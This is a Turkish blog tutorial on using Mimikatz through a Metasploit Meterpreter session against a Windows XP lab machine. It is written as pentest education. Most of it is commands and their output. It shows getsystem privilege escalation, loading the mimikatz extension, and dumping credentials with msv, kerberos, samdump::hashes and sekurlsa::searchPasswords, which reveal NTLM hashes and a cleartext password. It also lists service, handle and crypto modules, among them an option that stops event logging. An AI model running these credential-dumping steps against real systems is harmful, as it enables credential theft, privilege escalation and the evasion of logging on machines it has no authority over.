---
draft: false

title:  'MSF Mimikatz'
date: '2017-06-16T13:59:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple, harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.' 
 
url:  /tr/msf-mimikatz/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple, harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.



## Mimikatz nedir?



Mimikatz, esasında Benjamin Delpy tarafından yazılan bir post-exploitation programıdır. Hedef bilgisayardan bilgi toplama için kullanılır. Mimikatz, bilgi toplama için gerekli bir çok farklı komutu bünyesinde toplamıştır.



## Mimikatz Yükleme



Mimikatz, hedef sistemde bir Meterpreter oturumu açtıktan sonra çalıştırılabilir. Sisteme herhangi bir dosya yüklemeye gerek kalmadan hafıza üzerinde çalışır. Etkin olarak çalışabilmesi için SYSTEM seviyesinde oturum yetkilerine sahip olmamız gerekir.


```bash
meterpreter **>** getuid
Server username: WINXP-E95CE571A1\Administrator
```



Bu çıktıda, hedef sistemde SYSTEM seviyesinde olmadığımız görülmektedir. Öncelikle SYSTEM seviyesine geçmeye çalışalım.


```bash
meterpreter **>** getsystem
...got system **(**via technique 1**)**.

meterpreter **>** getuid
Server username: NT AUTHORITY\SYSTEM
```



Başarılı olduysanız yukarıdaki gibi SYSTEM seviyesine geçtiğinize dair çıktı alırsınız.



Mimikatz, 32-bit ve 64-bit mimarilerde çalışmak üzere tasarlanmıştır. SYSTEM seviyesine geçtikten sonra hedef sistemin mimarisinin ne olduğuna `sysinfo` komutuyla bakmalıyız. Bazen, Meterpreter oturum 64-bit mimaride çalışan bir 32-bit mimari prosesinde oturum açmış olabilir. Bu durumda mimikatz’ın bazı özellikleri çalışmayacaktır. Meterpreter oturumu 32-bit bir proseste çalışıyorsa (Mimari aslında 64-bit olmasına rağmen), mimikatz, 32-bit için yazılımları kullanmaya çalışacaktır. Bunun önüne geçmenin yolu `ps` komutuyla çalışan proseslere bakmak ve `migrate` komutuyla başka bir prosese geçmektir.


```bash
meterpreter **>** sysinfo
Computer        : WINXP-E95CE571A1
OS              : Windows XP **(**Build 2600, Service Pack 3**)**.
Architecture    : x86
System Language : en_US
Meterpreter     : x86/win32
```



Burada görülen çıktıda, hedef makinenin zaten 32-bit mimaride olduğunu görüyoruz. O zaman, 32-bit, 64-bit çakışması bulunmamaktadır. Artık `mimikatz` modülünü yükleyebiliriz.


```bash
meterpreter **>** load mimikatz
Loading extension mimikatz...success.
```



Yükleme başarıyla tamamlandıktan sonra öncelikle yardım bilgisini görüntüleyelim.


```bash
meterpreter **>** help mimikatz

Mimikatz Commands
**=================**

    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds
    livessp           Attempt to retrieve livessp creds
    mimikatz_command  Run a custom commannd
    msv               Attempt to retrieve msv creds **(**hashes**)**
    ssp               Attempt to retrieve ssp creds
    tspkg             Attempt to retrieve tspkg creds
    wdigest           Attempt to retrieve wdigest creds
```



Mimikatz, temel olarak yukarıdaki komutları kullanmamızı sağlarsa da içlerinde en güçlüsü `mimikatz_command` seçeneğidir.



Öncelikle mimikatz sürümünü kontrol edelim.


```bash
meterpreter **>** mimikatz_command -f version
mimikatz 1.0 x86 **(**RC**)** **(**Nov  7 2013 08:21:02**)**
```



Mimikatz’ın sağladığı bir takım modüller bulunur. Bu modüllerin listesini görmek için sistemde bulunmayan bir modül ismi vermeniz yeterlidir. Bu durumda mimikatz size kullanılabilir modüllerin listesini verecektir. Komut kullanımında `modüladı::` kullanım formatına dikkat edin.



Aşağıdaki örnekte, `fu::` modülü istenmiştir. Böyle bir modül olmadığından kullanılabilir tüm modülleri listelemiş olduk.


```bash
meterpreter **>** mimikatz_command -f fu::
Module : 'fu' introuvable

Modules disponibles : 
                - Standard
      crypto    - Cryptographie et certificats
        hash    - Hash
      system    - Gestion système
     process    - Manipulation des processus
      thread    - Manipulation des threads
     service    - Manipulation des services
   privilege    - Manipulation des privilèges
      handle    - Manipulation des handles
 impersonate    - Manipulation tokens d'accès
     winmine    - Manipulation du démineur
 minesweeper    - Manipulation du démineur 7
       nogpo    - Anti-gpo et patchs divers
     samdump    - Dump de SAM
      inject    - Injecteur de librairies
          ts    - Terminal Server
      divers    - Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
    sekurlsa    - Dump des sessions courantes par providers LSASS
         efs    - Manipulations EFS
```



Bu listede bulunan modüllerin kullanılabilir seçeneklerini listelemek için modül ismini vererek girilen komut aşağıdaki formatta kullanılmaktadır.


```bash
meterpreter > mimikatz_command -f divers::
Module : 'divers' identifié, mais commande '' introuvable

Description du module : Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
  noroutemon    - [experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage
   eventdrop    - [super experimental] Patch l'observateur d'événements pour ne plus rien enregistrer
  cancelator    - Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session
     secrets    - Affiche les secrets utilisateur
```



Gördüğünüz gibi `drivers` modülünün, `noroutemon, eventdrop, cancelator, secrets` seçenekleri bulunmaktadır.



## RAM Hafızadan Hash ve Parola Okuma



RAM hafızadan Hash değerlerini ve parolaları okumak için Metasploit Framework’ün sağladığı kendi komutlarını kullanabileceğimiz gibi `mimikaz` modüllerini de kullanabiliriz.



## Metasploit Komutları ile Bilgi Elde etme


```bash
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID   Package    Domain           User              Password
------   -------    ------           ----              --------
0;78980  NTLM       WINXP-E95CE571A1  Administrator     lm{ 00000000000000000000000000000000 }, ntlm{ d6eec67681a3be111b5605849505628f }
0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
0;56683  NTLM                                          n.s. (Credentials KO)
0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  n.s. (Credentials KO)

meterpreter > kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID   Package    Domain           User              Password
------   -------    ------           ----              --------
0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     
0;56683  NTLM                                          
0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   
0;78980  NTLM       WINXP-E95CE571A1  Administrator     SuperSecretPassword
```



## Mimikatz Modülleri ile Bilgi Elde Etme


```bash
meterpreter **>** mimikatz_command -f samdump::hashes
Ordinateur : winxp-e95ce571a1
BootKey    : 553d8c1349162121e2a5d3d0f571db7f

Rid  : 500
User : Administrator
LM   : 
NTLM : d6eec67681a3be111b5605849505628f

Rid  : 501
User : Guest
LM   : 
NTLM : 

Rid  : 1000
User : HelpAssistant
LM   : 6165cd1a0ebc61e470475c82cd451e14
NTLM : 

Rid  : 1002
User : SUPPORT_388945a0
LM   : 
NTLM : 771ee1fce7225b28f8aec4a88aea9b6a

meterpreter **>** mimikatz_command -f sekurlsa::searchPasswords
**[**0] **{** Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword **}**
```



## Diğer Modüller



Yukarıda örnek olarak gösterilen modüllerin haricinde başka modüllerde bulunur. Bunların tamamını <a href="http://blog.gentilkiwi.com/">Mimikatz</a> web sayfasından inceleyebilirsiniz.



## Kullanıcı Token Bilgileri


```bash
meterpreter **>** mimikatz_command -f handle::
Module : 'handle' identifié, mais commande '' introuvable

Description du module : Manipulation des handles
list              - Affiche les handles du système **(**pour le moment juste les processus et tokens**)**
processStop       - Essaye de stopper un ou plusieurs processus en utilisant d'autres handles
tokenImpersonate  - Essaye d'impersonaliser un token en utilisant d'autres handles
nullAcl           - Positionne une ACL null sur des Handles


meterpreter > mimikatz_command -f handle::list
...snip...
  760  lsass.exe                 ->  1004       Token           NT AUTHORITY ETWORK SERVICE
  760  lsass.exe                 ->  1008       Process 704     winlogon.exe
  760  lsass.exe                 ->  1052       Process 980     svchost.exe
  760  lsass.exe                 ->  1072       Process 2664    fubar.exe
  760  lsass.exe                 ->  1084       Token           NT AUTHORITY\LOCAL SERVICE
  760  lsass.exe                 ->  1096       Process 704     winlogon.exe
  760  lsass.exe                 ->  1264       Process 1124    svchost.exe
  760  lsass.exe                 ->  1272       Token           NT AUTHORITY\ANONYMOUS LOGON
  760  lsass.exe                 ->  1276       Process 1804    psia.exe
  760  lsass.exe                 ->  1352       Process 480     jusched.exe
  760  lsass.exe                 ->  1360       Process 2056    TPAutoConnSvc.exe
  760  lsass.exe                 ->  1424       Token           WINXP-E95CE571A1\Administrator
...snip...
```



## Windows Servisleri İşlemleri



Mimikatz, Windows servislerini başlatma, durdurma ve kaldırma imkanı da sağlamaktadır. Servis modülüne ve seçeneklerine bakalım.


```bash
meterpreter **>** mimikatz_command -f service::
Module : 'service' identifié, mais commande '' introuvable

Description du module : Manipulation des services
        list    - Liste les services et pilotes
       start    - Démarre un service ou pilote
        stop    - Arrête un service ou pilote
      remove    - Supprime un service ou pilote
    mimikatz    - Installe et/ou démarre le pilote mimikatz
```



Bu seçeneklerden, listeleme modülünü kullanalım.


```bash
meterpreter **>** mimikatz_command -f service::list
...snip...
        WIN32_SHARE_PROCESS     STOPPED RemoteRegistry  Remote Registry
        KERNEL_DRIVER   RUNNING RFCOMM  Bluetooth Device **(**RFCOMM Protocol TDI**)**
        WIN32_OWN_PROCESS       STOPPED RpcLocator      Remote Procedure Call **(**RPC**)** Locator
  980   WIN32_OWN_PROCESS       RUNNING RpcSs   Remote Procedure Call **(**RPC**)**
        WIN32_OWN_PROCESS       STOPPED RSVP    QoS RSVP
  760   WIN32_SHARE_PROCESS     RUNNING SamSs   Security Accounts Manager
        WIN32_SHARE_PROCESS     STOPPED SCardSvr        Smart Card
 1124   WIN32_SHARE_PROCESS     RUNNING Schedule        Task Scheduler
        KERNEL_DRIVER   STOPPED Secdrv  Secdrv
 1124   INTERACTIVE_PROCESS     WIN32_SHARE_PROCESS     RUNNING seclogon        Secondary Logon
 1804   WIN32_OWN_PROCESS       RUNNING Secunia PSI Agent       Secunia PSI Agent
 3460   WIN32_OWN_PROCESS       RUNNING Secunia Update Agent    Secunia Update Agent
...snip...
```



## Kripto Modülü



Mimikatz’ın sağladığı kripto modülüne ve seçeneklerine bakalım.


```bash
meterpreter **>** mimikatz_command -f crypto::
Module : 'crypto' identifié, mais commande '' introuvable

Description du module : Cryptographie et certificats
listProviders   - Liste les providers installés**)**
  listStores    - Liste les magasins système
listCertificates        - Liste les certificats
    listKeys    - Liste les conteneurs de clés
exportCertificates      - Exporte les certificats
  exportKeys    - Exporte les clés
    patchcng    - **[**experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
   patchcapi    - [experimental] Patch la CryptoAPI courante pour l'export de clés non exportable
```



Bu seçeneklerden `listProviders` seçeneğini kullanalım.


```bash
meterpreter > mimikatz_command -f crypto::listProviders
Providers CryptoAPI :
        Gemplus GemSAFE Card CSP v1.0
        Infineon SICRYPT Base Smart Card CSP
        Microsoft Base Cryptographic Provider v1.0
        Microsoft Base DSS and Diffie-Hellman Cryptographic Provider
        Microsoft Base DSS Cryptographic Provider
        Microsoft Base Smart Card Crypto Provider
        Microsoft DH SChannel Cryptographic Provider
        Microsoft Enhanced Cryptographic Provider v1.0
        Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider
        Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)
        Microsoft RSA SChannel Cryptographic Provider
        Microsoft Strong Cryptographic Provider
```



Yukarıdaki örneklerden göreceğiniz gibi, Mimikatz’a ait modüller ve bu modüllerin seçenekleri bulunuyor. Çok geniş ihtimaller dahilinde kullanabileceğiniz komutları tek tek deneyerek tecrübe kazanmanızı tavsiye ediyorum.
